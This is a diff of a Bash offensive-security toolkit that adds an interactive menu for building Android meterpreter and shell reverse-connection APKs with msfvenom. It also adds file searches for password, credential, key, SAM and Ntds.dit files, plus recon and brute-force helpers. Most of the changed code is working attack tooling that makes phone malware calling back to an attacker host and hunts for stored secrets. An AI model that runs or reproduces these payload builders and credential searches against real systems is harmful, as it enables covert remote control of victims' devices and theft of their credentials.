+    PSTORAGE_INTERESTING_LOGS=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "access\.log$|error\.log$" | sort | uniq | head -n 70)
+    PSTORAGE_OTHER_INTERESTING_FILES=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.bashrc$|\.google_authenticator$|hosts\.equiv$|\.lesshst$|\.plan$|\.profile$|\.recently-used\.xbel$|\.rhosts$|\.sudo_as_admin_successful$" | sort | uniq | head -n 70)
+    PSTORAGE_WINDOWS_FILES=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "unattend\.inf$|.*\.rdg$|AppEvent\.Evt$|ConsoleHost_history\.txt$|FreeSSHDservice\.ini$|NetSetup\.log$|Ntds\.dit$|protecteduserkey\.bin$|RDCMan\.settings$|SAM$|SYSTEM$|SecEvent\.Evt$|appcmd\.exe$|bash\.exe$|datasources\.xml$|default\.sav$|drives\.xml$|groups\.xml$|https-xampp\.conf$|https\.conf$|iis6\.log$|index\.dat$|my\.cnf$|my\.ini$|ntuser\.dat$|pagefile\.sys$|printers\.xml$|recentservers\.xml$|scclient\.exe$|scheduledtasks\.xml$|security\.sav$|server\.xml$|setupinfo$|setupinfo\.bak$|sitemanager\.xml$|sites\.ini$|software$|software\.sav$|sysprep\.inf$|sysprep\.xml$|system\.sav$|unattend\.txt$|unattend\.xml$|unattended\.xml$|wcx_ftp\.ini$|ws_ftp\.ini$|web.*\.config$|winscp\.ini$|wsl\.exe$" | sort | uniq | head -n 70)
+    PSTORAGE_DATABASE=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E '/man/|/usr/|/var/cache/' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.db$|.*\.sqlite$|.*\.sqlite3$" | sort | uniq | head -n 70)
+    PSTORAGE_BACKUPS=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "backup$|backups$" | sort | uniq | head -n 70)
+    PSTORAGE_PASSWORD_FILES=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*password.*$|.*credential.*$|creds.*$|.*\.key$" | sort | uniq | head -n 70)
 
 
     ##### POST SERACH VARIABLES #####
@@ -4060,10 +4310,10 @@ FunLinPEAS(){
     ( (netstat -punta || ss -nltpu || netstat -anv) | grep -i listen) 2>/dev/null | sed -${E} "s,127.0.[0-9]+.[0-9]+|:::|::1:|0\.0\.0\.0,${SED_RED},"
     echo ""
 
-    #-- NI) MacOS hardware ports
+    #-- NI) MacOS Hardware ports
     if [ "$MACPEAS" ]; then
       print_2title "Hardware Ports"
-      networksetup -listallhardwareports
+      networksetup -listallHardwareports
       echo ""
 
       print_2title "VLANs"
@@ -6029,10 +6279,244 @@ WinPrivPro(){
 
 }
 
+## Android Payloads
+CreateAndroidShell(){
+  echo "    ./msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk"
+  msfvenom -p $apv LHOST=${LocalHostIP} LPORT=$lport R > $save$paylod.apk
+}
+
+AndroidPayLoadPro(){
+  clear
+  while true; do
+    #statements
+    clear
+    AndroidPayLoadProMenu=$(echo "
+    ╔═╗╔╗╔╔╦╗╦═╗╔═╗╦╔╦╗     ╔═╗╔═╗╦ ╦╦  ╔═╗╔╦╗
+    ╠═╣║║║ ║║╠╦╝║ ║║ ║║     ╠═╝╠═╣╚╦╝║  ║ ║ ║║
+    ╩ ╩╝╚╝═╩╝╩╚═╚═╝╩═╩╝     ╩  ╩ ╩ ╩ ╩═╝╚═╝═╩╝
+    :::::::::::::::: [ TYPE ] ::::::::::::::::::
+
+    ➡ [p]${LGreen} android/meterpreter/reverse_http
+
+    ${BBlue} LHOST${BCyan} ${LocalHostIP}
+    ${BBlue} LPORT${BCyan} ${set_LPORT}
+
+    ${ORANGE}➡ [1]${BBlue} android/meterpreter/reverse_http
+    ${ORANGE}➡ [2]${BBlue} android/meterpreter/reverse_https
+    ${ORANGE}➡ [3]${BBlue} android/meterpreter/reverse_tcp
+    ${ORANGE}➡ [4]${BBlue} android/meterpreter_reverse_http
+    ${ORANGE}➡ [5]${BBlue} android/meterpreter_reverse_https
+    ${ORANGE}➡ [6]${BBlue} android/meterpreter_reverse_tcp
+    ${ORANGE}➡ [7]${BBlue} android/shell/reverse_http
+    ${ORANGE}➡ [8]${BBlue} android/shell/reverse_https
+    ${ORANGE}➡ [9]${BBlue} android/shell/reverse_tcp
+
+    :::::::::::::::: [ SELECT ] ::::::::::::::::::")
+    read -p "${AndroidPayLoadProMenu}" cmd
+    case "$cmd" in
+      p|pp)
+      clear
+      SettingPayload(){
+        clear
+        echo "${BYellow} ENTER YOUR${BBlue} PAYLOD${BYellow} NAME${BCyan}"
+        read "─────➤   "  paylod
+        echo "${BYellow} ENTER YOUR${BBlue} LHOST${BCyan} ${LocalHostIP}"
+        echo "${BYellow} ENTER YOUR${BBlue} LPORT${BCyan}"
+        read "─────➤   "  lport
+        echo "${BYellow} [[[$pink SAVE LOCATION${BYellow} ]]]${BGreen} $rset"
+        echo "➡ [1]${BBlue} /sdcard/ (termux) $rset";
+        echo "➡ [2]${BBlue} /home/kali/Desktop/ (Kali Linux) $rset";
+        echo    "╭─$pink[[[${BYellow} Select any option$pink ]]]${BCyan}"
+        read -p "╰──────────➤ "  h
+        case "$h" in
+          1)
+          clear
+          save='/sdcard/'
+          echo "\n"
+          echo "${BBlue} Conform The Detail"
+          echo "${BCyan} PAYLOD TYPE${BYellow} =${BGreen} $apv"
+          echo "${BCyan} PAYLOD NAME${BYellow} =${BGreen} $paylod"
+          echo "${BCyan} LHOST${BYellow} =${BGreen} $LocalHostIP"
+          echo "${BCyan} LPORT${BYellow} =${BGreen} $lport"
+          echo "${BCyan} SAVE${BYellow} =${BGreen} $save"
+          echo "\n"
+          echo "    ${BRed}   Edit$pink The Detail ?${BGreen} (${BBlue}y${BGreen}/${BRed}n${BGreen})$rset"
+          read e1
+          if [[ $e1 = 'y' ]] ; then
+            clear
+            SettingPayload
+            read -p ${Press_ENTER}
+          else
+            cd "${MainDirectoriyCaseName}"
+            clear
+            echo "./msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk"
+            ./msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk
+            read -p ${Press_ENTER}
+          fi
+          ;;
+          2)
+          clear
+          save='/home/kali/Desktop/'
+          echo "${BBlue} Conform The Detail"
+          echo "${BCyan} PAYLOD TYPE${BYellow} =${BGreen} $apv"
+          echo "${BCyan} PAYLOD NAME${BYellow} =${BGreen} $paylod"
+          echo "${BCyan} LHOST${BYellow} =${BGreen} $lhost"
+          echo "${BCyan} LPORT${BYellow} =${BGreen} $lport"
+          echo "${BCyan} SAVE${BYellow} =${BGreen} $save"
+          echo ""
+          echo "    ${BRed}   Edit$pink The Detail ?${BGreen} (${BBlue}y${BGreen}/${BRed}n${BGreen})$rset"
+          read e1
+          if [[ $e1 = 'y' ]] ; then
+            clear
+            SettingPayload
+            read -p ${Press_ENTER}
+          elif [[ $e1 = 'n' ]] ; then
+            cd "${MainDirectoriyCaseName}"
+            clear
+            echo "msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk"
+            msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk
+            read -p ${Press_ENTER}
+          fi
+          ;;
+          *)
+          clear
+          echo "${BGreen} sorry, the  option you looking is not found"
+          ;;
+        esac
+      }
+      SettingPayload
+
+      ;;
+      1)
+      clear
+      apv='android/meterpreter/reverse_http'
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      2)
+      clear
+      apv='android/meterpreter/reverse_https'
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      3)
+      clear
+      apv='android/meterpreter/reverse_tcp'
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      4)
+      clear
+      apv='android/meterpreter_reverse_http'
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      5)
+      clear
+      apv='android/meterpreter_reverse_https'
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      6)
+      clear
+      apv='android/meterpreter_reverse_tcp'
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      7)
+      clear
+      apv='android/shell/reverse_http'
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      8)
+      clear
+      apv='android/shell/reverse_https'
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      9)
+      clear
+      apv='android/shell/reverse_tcp'
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      00)
+      clear
+      exit
+      ;;
+    esac
+  done
+
+}
+
 ###############################################
 #         Information Gathering
 ###############################################
+## Information Gathering
+Input_Local_Interface(){
+  if [ -z ${LocalHostNAME} ]; then
+    #statements
+    echo "\n"
+    echo  "    [*] Finding your Network Interfaces... "$GREEN
+    echo "\n"
+    ifconfig -a
+    echo "\n"
+    echo  "    [*] Enter Your Interface : "${BBlue}
+    echo "\n"
+    read LocalHostNAME
+  fi
+}
+Info_LocalNeZt(){
+  Input_Local_Interface
 
+  Get_Public_IP=$(dig +short myip.opendns.com @resolver1.opendns.com 2>/dev/null)
+  Get_Public_Name=$(dig +short -x ${Get_Public_IP} 2>/dev/null | sed 's/\.$//')
+
+  Get_Public_IP_Raw=$(whois "${Get_Public_IP}" 2>/dev/null)
+  Get_Provider_Name=$(echo "${Get_Public_IP_Raw}" | awk '/Information related to/,0' | grep "^descr:" | head -1 | awk -F":" '{print substr($0, index($0,$2))}' | xargs)
+
+  # Get_Public_IP_Raw_org1=$(echo "${Get_Public_IP_Raw}" | grep "^descr:" | grep -v "^$" | awk '!a[$0]++' | awk -F":" '{print substr($0, index($0,$2))}' | head -1 | xargs | grep -v "^$")
+
+}
+
+
+
+Local_Net_Info(){
+  mkdir "${MainDirectoriyCaseNameLocal}"
+	devices=$(netstat -i | cut -d" " -f1 | egrep -v "^Kernel|Iface|lo")
+	write_header " Network information "
+	echo "Total network interfaces found : $(wc -w | ${devices})"
+  echo "\n"
+	echo "        ${DGrey}-----------------------"
+	echo "        ${DGrey}--- ${ORANGE}IP Address Info${DGrey} ---"
+	echo "        ${DGrey}-----------------------"
+  echo "\n${Orange}"
+	echo "$(ip -4 address show)" >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-Local_Net_Info.log"
+
+  echo "\n"
+	echo "        ${DGrey}-----------------------"
+	echo "        ${DGrey}--- ${ORANGE}Network Routing${DGrey} ---"
+	echo "        ${DGrey}-----------------------"
+  echo "\n${Orange}"
+	echo "$(netstat -nr)" >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-Local_Net_Info.log"
+
+  echo "\n"
+	echo "        ${DGrey}--------------------------------------"
+	echo "        ${DGrey}--- ${ORANGE}Interface Traffic information${DGrey}  ---"
+	echo "        ${DGrey}--------------------------------------"
+  echo "\n${Orange}"
+	echo "$(netstat -i)" >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-Local_Net_Info.log"
+
+  echo "\n"
+	echo "        ${DGrey}------------------------------"
+	echo "        ${DGrey}--- ${ORANGE}MAC/Hardware Addresses${DGrey} ---"
+	echo "        ${DGrey}------------------------------"
+  echo "\n${Orange}"
+	echo "$(cat /sys/class/net/*/address)"  >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-Local_Net_Info.log"
+}
+
+#
 # TraceRoute Scan Log
 infoTraceRoute(){
   echo "\n\t\t${BGreen}### TraceRoute Scan Log | Time: $(date)"
@@ -6069,6 +6553,15 @@ infoDig(){
   echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
   read -p "$Press_ENTER"
 }
+# Arp Scan Log
+infoArp(){
+  echo "\n\t\t${BGreen}### Arp Scan Log | Time: $(date)"
+  echo "# Arp Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(arp -a) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  read -p "$Press_ENTER"
+}
 # WhoIs Scan Log
 infoWhois(){
   echo "\n\t\t${BGreen}### WhoIs Scan Log | Time: $(date)"
@@ -6078,15 +6571,9 @@ infoWhois(){
   echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
   read -p "$Press_ENTER"
 }
-# Dirb Scan Log
-infoDirb(){
-  echo "\n\t\t${BGreen}### Dirb Scan Log | Time: $(date)"
-  echo "# Dirb Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
-  echo " $(dirb http://$targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
-  read -p "$Press_ENTER"
-}
+
+##  Vulnerability Scanning
+#
 # Nmap Scan Log
 infoNmap(){
   echo "\n\t\t${BGreen}### Nmap Scan Log | Time: $(date)"
@@ -6096,12 +6583,12 @@ infoNmap(){
   echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
   read -p "$Press_ENTER"
 }
-# Arp Scan Log
-infoArp(){
-  echo "\n\t\t${BGreen}### Arp Scan Log | Time: $(date)"
-  echo "# Arp Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+# Dirb Scan Log
+infoDirb(){
+  echo "\n\t\t${BGreen}### Dirb Scan Log | Time: $(date)"
+  echo "# Dirb Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
   echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
-  echo " $(arp -a) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(dirb http://$targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
   echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
   read -p "$Press_ENTER"
 }
@@ -6120,49 +6607,14 @@ AllInfo(){
   infoArp
 }
 
-#----------------------------------------------------------------------#
-# CLI | Network Inferface/Routing/MAC Address info (i.e. IP & NetStat) #
-#----------------------------------------------------------------------#
-Local_Net_Info(){
-  mkdir "${MainDirectoriyCaseNameLocal}"
-	devices=$(netstat -i | cut -d" " -f1 | egrep -v "^Kernel|Iface|lo")
-	write_header " Network information "
-	echo "Total network interfaces found : $(wc -w | ${devices})"
-  echo "\n"
-	echo "        ${DGrey}-----------------------"
-	echo "        ${DGrey}--- ${ORANGE}IP Address Info${DGrey} ---"
-	echo "        ${DGrey}-----------------------"
-  echo "\n${Orange}"
-	echo "$(ip -4 address show)" >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-Local_Net_Info.log"
-
-  echo "\n"
-	echo "        ${DGrey}-----------------------"
-	echo "        ${DGrey}--- ${ORANGE}Network Routing${DGrey} ---"
-	echo "        ${DGrey}-----------------------"
-  echo "\n${Orange}"
-	echo "$(netstat -nr)" >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-Local_Net_Info.log"
-
-  echo "\n"
-	echo "        ${DGrey}--------------------------------------"
-	echo "        ${DGrey}--- ${ORANGE}Interface Traffic information${DGrey}  ---"
-	echo "        ${DGrey}--------------------------------------"
-  echo "\n${Orange}"
-	echo "$(netstat -i)" >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-Local_Net_Info.log"
-
-  echo "\n"
-	echo "        ${DGrey}------------------------------"
-	echo "        ${DGrey}--- ${ORANGE}MAC/Hardware Addresses${DGrey} ---"
-	echo "        ${DGrey}------------------------------"
-  echo "\n${Orange}"
-	echo "$(cat /sys/class/net/*/address)"  >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-Local_Net_Info.log"
-}
 
 #---------------------------------------#
 # CLI | Get information about localhost #
 #---------------------------------------#
 Host_Info(){
-   mkdir "${MainDirectoriyCaseNameLocal}"
+   cd "${MainDirectoriyCaseNameLocal}"
 	 dnsips=$(sed -e '/^$/d' /etc/resolv.conf | awk '{if (tolower($1)=="nameserver") print $2}')
+
    echo "
     ${BCyan}${faintT}-=x=-=x=-=x=-=x=-=x=-=x=-=[ Hostname and DNS information ]=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-
 
@@ -6177,9 +6629,8 @@ Host_Info(){
     ${BCyan}${faintT}-=x=-=x=-=x=-=x=-=x=-=x=-=[ Hostname and DNS information ]=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-
     "
 }
-
 Mac_Host_Info(){
-  # reports system hardware and software configuration
+  # reports system Hardware and software configuration
   echo"
     Examples:
 
@@ -6261,6 +6712,10 @@ Mac_Host_Info(){
 
 }
 
+#----------------------------------------------------------------------#
+# CLI | Network Inferface/Routing/MAC Address info (i.e. IP & NetStat) #
+#----------------------------------------------------------------------#
+
 #---------------------------------------#
 # CLI | Get Bacsic Information About OS #
 #---------------------------------------#
@@ -6292,33 +6747,7 @@ BasicInfo() {
 
 }
 
-#---------------------------------------#
-# CLI | Get information User localhost  #
-#---------------------------------------#
-UserInfo() {
-  user=$(whoami)      2> /dev/null # Current user
-  host=$(uname -n)    2> /dev/null # Network node hostname
-  home=$(echo $HOME)  2> /dev/null # User home directory
-  usid=$(id -u)       2> /dev/null # User ID
-  gpid=$(id -g)       2> /dev/null # Group ID
-  grps=$(for i in $(groups | tr "," " "); do echo "\t\t${BRed}[${LYellow} $i ${BRed}]"; done)      2> /dev/null # List all groups
 
-  echo "
-  ${BCyan}${faintT}-=x=-=x=-=x=-=x=-=x=-=x=-=[ User Information ]=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-
-
-  ${DGrey}┌───────╼ ${BRed}[${BYellow} User Information ${BRed}]
-  ${DGrey}|
-  ${DGrey}|──╼ ${BRed}[${BYellow} Username  ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${user} ${BRed}]
-  ${DGrey}|──╼ ${BRed}[${BYellow} Hostname  ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${host} ${BRed}]
-  ${DGrey}|──╼ ${BRed}[${BYellow} Home Path ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${home} ${BRed}]
-  ${DGrey}|──╼ ${BRed}[${BYellow} EUID      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${usid} ${BRed}]
-  ${DGrey}|──╼ ${BRed}[${BYellow} User ID   ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} \n$(for i in $(id | tr "," " "); do echo "\t\t${BRed}[${LYellow} $i   ${BRed}]"; done) ${BRed}]
-  ${DGrey}|──╼ ${BRed}[${BYellow} EGID      ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${gpid} ${BRed}]
-  ${DGrey}┖──╼ ${BRed}[${BYellow} Groups    ${BRed}]${BCyan}${faintT}───╼ ${resetT}${BRed}[${ORANGE}${nc} ${grps} ${BRed}]
-
-  ${BCyan}${faintT}-=x=-=x=-=x=-=x=-=x=-=x=-=[ User Information ]=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-"
-
-}
 
 #---------------------------------------#
 # CLI | Get information about Packages  #
@@ -8241,7 +8670,7 @@ BrutePort(){
 
   if [ ! -z "$2" ]; then
   	if [ "$2" -gt "64" ] || [ "$2" -lt "1" ]; then
-  		echo -e "[${red}!${default}] Maximum number of threads is 64!"
+  		echo "[${red}!${default}] Maximum number of threads is 64!"
   		exit
   	else
   		thread=$2
@@ -8406,7 +8835,7 @@ BruteAttackStatus(){
     ${BCyan}${faintT}|──${resetT}${BRed}[ 🎯 ]${BCyan}${faintT}──${resetT}${BRed}[${DGrey}$(FunTargetUserName)${BRed}]${BCyan}${faintT}──╼  ${LRed}${faintT}Username${BBlue}: ${BGreen}${UserName}
     ${BCyan}${faintT}|──${resetT}${BRed}[ 🎯 ]${BCyan}${faintT}──${resetT}${BRed}[${DGrey}$(FunTargetUserPass)${BRed}]${BCyan}${faintT}──╼  ${LRed}${faintT}Password${BBlue}: ${BGreen}${UserPass}
     ${BCyan}${faintT}|
-    ${BCyan}${faintT}└──${resetT}${BRed}[${DGrey} CL ${BRed}]${faintT}${BCyan}──╼${resetT} ${BRed}[${DGrey} Cleaning Target Variables ${BRed}]
+    ${BCyan}${faintT}└──${resetT}${BRed}[${DGrey} CL ${BRed}]${faintT}${BCyan}──╼${resetT} ${BRed}[${DGrey} 🧹 Cleaning Target Variables  🧹 ${BRed}]
     ")
     echo "$ToolStatus"
 }
@@ -8441,7 +8870,7 @@ UnzipKerbrute(){
       # git clone https://github.com/ropnop/kerbrute.git
     fi
   fi
-  # if [ ${system} = "linux" || ${system} = "mac" ]; then
+  # if [ ${MySystem} = "linux" || ${MySystem} = "mac" ]; then
   # fi
 }
 
@@ -8557,9 +8986,7 @@ AnonymousInstaller(){
       fi
       echo "      [*] [ CONNECT ]"
       echo "      ============ install TorGhost for you ============="
-      sleep 4
       echo "      [*] working..........."
-      sleep 1
       git clone https://github.com/susmithHCK/torghost.git
       cd torghost/
       chmod +x install.sh
@@ -8755,6 +9182,7 @@ MainMenu(){
             read -p "${Press_ENTER}"
             ;;
             nt|NT|netpro|NetPro)
+            Info_LocalNet
             while true; do
               clear
               ToolHeaderRun
@@ -8766,24 +9194,36 @@ MainMenu(){
     ║║║├┤  │ ││││ │├┬┘├┴┐│││││ ┬
     ╝╚╝└─┘ ┴ └┴┘└─┘┴└─┴ ┴┴┘└┘└─┘
 
-    ${DGrey}┌────╼ ${BRed}[${BYellow} Networking ${BRed}]
-    ${DGrey}┖─┲──╼ ${BRed}[${BYellow} Control Manager for Networking ${BRed}]
-    ${DGrey}  ┖──╼ ${BRed}[${BYellow} Use it for Easy life ${BRed}]
+    ${DGrey}┌─╼ ${BRed}[${BYellow} Networking ${BRed}]
+    ${DGrey}┖─┲─╼ ${BRed}[${BYellow} Control Manager for Networking ${BRed}]
+    ${DGrey}  ┖─╼ ${BRed}[${BYellow} Use it for Easy life ${BRed}]
 
-    options :${BBlue}
-    ${DGrey}┌──${BRed}[${BWhite} 01 ${BRed}]${BYellow}╼▰ Show Yuor Info Use Ifconfig
-    ${DGrey}|──${BRed}[${BWhite} 02 ${BRed}]${BYellow}╼▰ Enable Monitor Mode
-    ${DGrey}|──${BRed}[${BWhite} 03 ${BRed}]${BYellow}╼▰ Disabled Monitor Mode
-    ${DGrey}|──${BRed}[${BWhite} 04 ${BRed}]${BYellow}╼▰ Down Interface
-    ${DGrey}|──${BRed}[${BWhite} 05 ${BRed}]${BYellow}╼▰ Up Interface
-    ${DGrey}|──${BRed}[${BWhite} 06 ${BRed}]${BYellow}╼▰ Restart Network-Manager
-    ${DGrey}|──${BRed}[${BWhite} 07 ${BRed}]${BYellow}╼▰ Change My hostname
-    ${DGrey}|──${BRed}[${BWhite} 08 ${BRed}]${BYellow}╼▰ Change My MAC Address
-    ${DGrey}|──${BRed}[${BWhite} 09 ${BRed}]${BYellow}╼▰ Show My Public IP Address
-    ${DGrey}|──${BRed}[${BWhite} 10 ${BRed}]${BYellow}╼▰ Find Live Hosts In My Network
-    ${DGrey}|──${BRed}[${BWhite} 11 ${BRed}]${BYellow}╼▰ Open My Router Default Page
-    ${DGrey}|──${BRed}[${BWhite} 12 ${BRed}]${BYellow}╼▰ EdIt etter.dns
-    ${DGrey}└──${BRed}[${BWhite} 13 ${BRed}]${BYellow}╼▰ Edit etter.conf
+    ${LGreen}┌─╼ ${BRed}[${LGreen} Public ${BRed}]
+    ${LGreen}┖─┲─╼ ${BRed}[${BGreen} Public IP ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${Get_Public_IP} ${BRed}]${LGreen}╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Public DNS ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${Get_Public_Name} ${BRed}]${LGreen}╼▰
+    ${LGreen}  ┖─╼ ${BRed}[${BGreen} Provider NAME ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${Get_Provider_Name} ${BRed}]${LGreen}╼▰
+
+    ${LGreen}┌─╼ ${BRed}[${LGreen} Local Net Info ${BRed}]
+    ${LGreen}┖─┲─╼ ${BRed}[${BGreen} Host IP ${BRed}]${LGreen}──────╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostIP} ${BRed}]${LGreen}──╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Host NAME ${BRed}]${LGreen}────╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostNAME} ${BRed}]${LGreen}─────╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Gateway IP ${BRed}]${LGreen}───╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayIP} ${BRed}]${LGreen}──╼▰
+    ${LGreen}  |─╼ ${BRed}[${BGreen} Gateway NAME ${BRed}]${LGreen}─╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayNAME} ${BRed}]${LGreen}╼▰
+    ${LGreen}  ┖─╼ ${BRed}[${BGreen} Hardware NAME ${BRed}]${LGreen}╼▰ ${resetT}${BRed}[${LGreen} ${HardwarePort_Name} ${BRed}]${LGreen}─╼▰
+
+    ${DGrey}┌─╼ ${BRed}[${BYellow} Options ${BRed}]
+    ${DGrey}┖─┲──${BYellow}╼▰ ${BRed}[${BWhite} 01 ${BRed}]${BYellow}╼▰ Choose Network Interface
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 02 ${BRed}]${BYellow}╼▰ Enable Monitor Mode
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 03 ${BRed}]${BYellow}╼▰ Disabled Monitor Mode
